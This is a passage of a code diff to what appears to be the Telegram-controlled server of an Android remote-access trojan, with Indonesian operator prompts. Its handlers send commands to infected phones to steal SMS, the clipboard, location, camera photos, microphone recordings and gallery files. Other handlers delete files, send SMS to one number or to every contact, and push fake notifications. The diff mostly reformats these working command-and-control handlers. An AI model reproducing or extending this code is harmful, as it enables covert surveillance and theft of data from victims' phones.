-        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
-        {
-            parse_mode: "HTML",
-            "reply_markup": {
-                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
-                'resize_keyboard': true
+        )
+    }
+    if (commend == 'messages') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('messages');
             }
-        }
-    )
-}
-if (commend == 'clipboard') {
-    appSocket.clients.forEach(function each(ws) {
-        if (ws.uuid == uuid) {
-            ws.send('clipboard');
-        }
-    });
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
-        {
-            parse_mode: "HTML",
-            "reply_markup": {
-                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
-                'resize_keyboard': true
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Permintaan Anda sedang diproses\n\n' +
+            '• Anda akan menerima respons dalam beberapa saat',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    'resize_keyboard': true
+                }
             }
-        }
-    )
-}
-
-if (commend == 'camera_main') {
-    appSocket.clients.forEach(function each(ws) {
-        if (ws.uuid == uuid) {
-            ws.send('camera_main');
-        }
-    });
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
-        {
-            parse_mode: "HTML",
-            "reply_markup": {
-                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
-                'resize_keyboard': true
+        )
+    }
+    if (commend == 'apps') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('apps');
             }
-        }
-    )
-}
-
-if (commend == 'camera_selfie') {
-    appSocket.clients.forEach(function each(ws) {
-        if (ws.uuid == uuid) {
-            ws.send('camera_selfie');
-        }
-    });
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
-        {
-            parse_mode: "HTML",
-            "reply_markup": {
-                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
-                'resize_keyboard': true
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Permintaan Anda sedang diproses\n\n' +
+            '• Anda akan menerima respons dalam beberapa saat',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    'resize_keyboard': true
+                }
             }
-        }
-    )
-}
-if (commend == 'location') {
-    appSocket.clients.forEach(function each(ws) {
-        if (ws.uuid == uuid) {
-            ws.send('location');
-        }
-    });
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
-        {
-            parse_mode: "HTML",
-            "reply_markup": {
-                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
-                'resize_keyboard': true
+        )
+    }
+    if (commend == 'device_info') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('device_info');
             }
-        }
-    )
-}
-
-if (commend == 'vibrate') {
-    appSocket.clients.forEach(function each(ws) {
-        if (ws.uuid == uuid) {
-            ws.send('vibrate');
-        }
-    });
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
-        {
-            parse_mode: "HTML",
-            "reply_markup": {
-                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
-                'resize_keyboard': true
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Permintaan Anda sedang diproses\n\n' +
+            '• Anda akan menerima respons dalam beberapa saat',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    'resize_keyboard': true
+                }
             }
-        }
-    )
-}
-
-if (commend == 'stop_audio') {
-    appSocket.clients.forEach(function each(ws) {
-        if (ws.uuid == uuid) {
-            ws.send('stop_audio');
-        }
-    });
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
-        {
-            parse_mode: "HTML",
-            "reply_markup": {
-                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
-                'resize_keyboard': true
+        )
+    }
+    if (commend == 'clipboard') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('clipboard');
             }
-        }
-    )
-}
-if (commend == 'send_message') {
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙣𝙤𝙢𝙤𝙧 𝙩𝙪𝙟𝙪𝙖𝙣 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙠𝙞𝙧𝙞𝙢 𝙎𝙈𝙎\n\n' +
-        '•ᴋᴇᴛɪᴋ ɴᴏᴍᴏʀ ʟᴏᴋᴀʟ ᴅᴇɴɢᴀɴ ᴀᴡᴀʟᴀɴ 0, ᴀᴛᴀᴜ ᴅᴇɴɢᴀɴ ᴋᴏᴅᴇ ɴᴇɢᴀʀᴀ ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇɴɢɪʀɪᴍ ɪɴᴛᴇʀɴᴀꜱɪᴏɴᴀʟ',
-        {"reply_markup": {force_reply: true}}
-    )
-    currentUuid = uuid
-}
-
-if (commend == 'send_message_to_all') {
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙠𝙞𝙧𝙞𝙢 𝙠𝙚 𝙨𝙚𝙢𝙪𝙖 𝙠𝙤𝙣𝙩𝙖𝙠\n\n' +
-        '• ʜᴀʀᴀᴘ ᴘᴇʀʜᴀᴛɪᴋᴀɴ: ᴘᴇꜱᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴊɪᴋᴀ ᴊᴜᴍʟᴀʜ ᴋᴀʀᴀᴋᴛᴇʀ ᴍᴇʟᴇʙɪʜɪ ʙᴀᴛᴀꜱ',
-        {"reply_markup": {force_reply: true}}
-    )
-    currentUuid = uuid
-}
-
-if (commend == 'file') {
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙟𝙖𝙡𝙪𝙧 𝙛𝙞𝙡𝙚 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙪𝙣𝙙𝙪𝙝\n\n' +
-        '• ᴛɪᴅᴀᴋ ᴘᴇʀʟᴜ ᴊᴀʟᴜʀ ʟᴇɴɢᴋᴀᴘ, ᴄᴜᴋᴜᴘ ᴍᴀꜱᴜᴋᴋᴀɴ ɴᴀᴍᴀ ꜰᴏʟᴅᴇʀ ᴜᴛᴀᴍᴀ. ᴄᴏɴᴛᴏʜ: <b>DCIM/Camera</b>',
-        {"reply_markup": {force_reply: true}, parse_mode: "HTML"}
-    )
-    currentUuid = uuid
-}
-
-if (commend == 'delete_file') {
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙟𝙖𝙡𝙪𝙧 𝙛𝙞𝙡𝙚 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙝𝙖𝙥𝙪𝙨\n\n' +
-        '• ᴛɪᴅᴀᴋ ᴘᴇʀʟᴜ ᴊᴀʟᴜʀ ʟᴇɴɢᴋᴀᴘ, ᴄᴜᴋᴜᴘ ᴍᴀꜱᴜᴋᴋᴀɴ ꜰᴏʟᴅᴇʀ ᴜᴛᴀᴍᴀ ᴄᴏɴᴛᴏʜ: <b>DCIM/Camera</b>',
-        {"reply_markup": {force_reply: true}, parse_mode: "HTML"}
-    )
-    currentUuid = uuid
-}
-
-if (commend == 'microphone') {
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙗𝙚𝙧𝙖𝙥𝙖 𝙙𝙚𝙩𝙞𝙠 𝙢𝙞𝙠𝙧𝙤𝙛𝙤𝙣 𝙙𝙞𝙧𝙚𝙠𝙖𝙢\n\n' +
-        '• ᴍᴀꜱᴜᴋᴋᴀɴ ᴀɴɢᴋᴀ ꜱᴀᴊᴀ ᴅᴀʟᴀᴍ ᴅᴇᴛɪᴋ',
-        {"reply_markup": {force_reply: true}, parse_mode: "HTML"}
-    )
-    currentUuid = uuid
-}
-
-if (commend == 'toast') {
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙢𝙪𝙣𝙘𝙪𝙡 𝙨𝙚𝙗𝙖𝙜𝙖𝙞 𝙩𝙤𝙖𝙨𝙩 𝙙𝙞 𝙡𝙖𝙮𝙖𝙧\n\n' +
-        '• ᴛᴏᴀꜱᴛ ᴀᴅᴀʟᴀʜ ᴘᴇꜱᴀɴ ꜱɪɴɢᴋᴀᴛ ʏᴀɴɢ ᴍᴜɴᴄᴜʟ ꜱᴇʙᴇɴᴛᴀʀ ᴅɪ ʟᴀʏᴀʀ ᴘᴇʀᴀɴɢᴋᴀᴛ',
-        {"reply_markup": {force_reply: true}, parse_mode: "HTML"}
-    )
-    currentUuid = uuid
-}
-
-if (commend == 'show_notification') {
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙢𝙪𝙣𝙘𝙪𝙡 𝙨𝙚𝙗𝙖𝙜𝙖𝙞 𝙣𝙤𝙩𝙞𝙛𝙞𝙠𝙖𝙨𝙞\n\n' +
-        '• ᴘᴇꜱᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴛᴇʀᴛᴀᴍᴘɪʟ ᴅɪ ʙᴀʀɪꜱ ꜱᴛᴀᴛᴜꜱ ʟᴀʏᴀʀ ꜱᴇᴘᴇʀᴛɪ ɴᴏᴛɪꜰɪᴋᴀꜱɪ ʙɪᴀꜱᴀ',
-        {"reply_markup": {force_reply: true}, parse_mode: "HTML"}
-    )
-    currentUuid = uuid
-}
-
-if (commend == 'play_audio') {
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙡𝙞𝙣𝙠 𝙖𝙪𝙙𝙞𝙤 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙥𝙪𝙩𝙖𝙧\n\n' +
-        '• ᴛᴇᴋᴀɴᴋᴀɴ: ʜᴀʀᴜꜱ ᴍᴀꜱᴜᴋᴋᴀɴ ʟɪɴᴋ ꜱᴜᴀʀᴀ ꜱᴇᴄᴀʀᴀ ᴅɪʀᴇᴋᴛ, ᴊɪᴋᴀ ᴛɪᴅᴀᴋ ᴍᴀᴋᴀ ꜱᴜᴀʀᴀ ᴛɪᴅᴀᴋ ᴅɪᴘᴜᴛᴀʀ',
-        {"reply_markup": {force_reply: true}, parse_mode: "HTML"}
-    )
-    currentUuid = uuid
-}
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Permintaan Anda sedang diproses\n\n' +
+            '• Anda akan menerima respons dalam beberapa saat',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'camera_main') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('camera_main');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Permintaan Anda sedang diproses\n\n' +
+            '• Anda akan menerima respons dalam beberapa saat',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'camera_selfie') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('camera_selfie');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Permintaan Anda sedang diproses\n\n' +
+            '• Anda akan menerima respons dalam beberapa saat',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'location') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('location');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Permintaan Anda sedang diproses\n\n' +
+            '• Anda akan menerima respons dalam beberapa saat',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'vibrate') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('vibrate');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Permintaan Anda sedang diproses\n\n' +
+            '• Anda akan menerima respons dalam beberapa saat',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'stop_audio') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('stop_audio');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Permintaan Anda sedang diproses\n\n' +
+            '• Anda akan menerima respons dalam beberapa saat',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'send_message') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id, '°• Silakan balas dengan nomor yang ingin Anda kirimi SMS\n\n' +
+            '• Jika Anda ingin mengirim SMS ke nomor lokal, Anda bisa memasukkan nomor dengan awalan nol. Jika ke nomor internasional, masukkan dengan kode negara',
+            {reply_markup: {force_reply: true}})
+        currentUuid = uuid
+    }
+    if (commend == 'send_message_to_all') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Masukkan pesan yang ingin Anda kirim ke semua kontak\n\n' +
+            '• Harap hati-hati, pesan tidak akan dikirim jika jumlah karakter dalam pesan Anda melebihi batas yang diizinkan',
+            {reply_markup: {force_reply: true}}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'file') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Masukkan jalur file yang ingin Anda unduh\n\n' +
+            '• Anda tidak perlu memasukkan jalur file lengkap, cukup masukkan jalur utamanya. Misalnya, masukkan DCIM/Camera untuk menerima file galeri',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'delete_file') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Masukkan jalur file yang ingin Anda hapus\n\n' +
+            '• Anda tidak perlu memasukkan jalur lengkap file, cukup masukkan jalur utamanya. Misalnya, masukkan DCIM/Camera untuk menghapus file galeri',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'microphone') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Masukkan berapa lama Anda ingin mikrofon merekam\n\n' +
+            '• Perlu dicatat bahwa Anda harus memasukkan waktu dalam satuan detik contoh 20 berarti 20 detik',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'toast') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Masukan pesan yang muncul sebagai toast di layar\n\n' +
+            '• Toast adalah pesan singkat yang muncul sebentar di layar perangkat', 
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'show_notification') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Masukan pesan yang akan di munculkan sebagai notifikasi\n\n' +
+            '• Pesan ini akan tampil di baris status seperti notifikasi biasa',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'play_audio') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Masukan link audio yang ingin di putar\n\n' +
+            '• ɴᴏᴛᴇ Harus masukan link suara secara direct, jika tidak maka suara tidak akan di putar',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
 });
 setInterval(function () {
     appSocket.clients.forEach(function each(ws) {
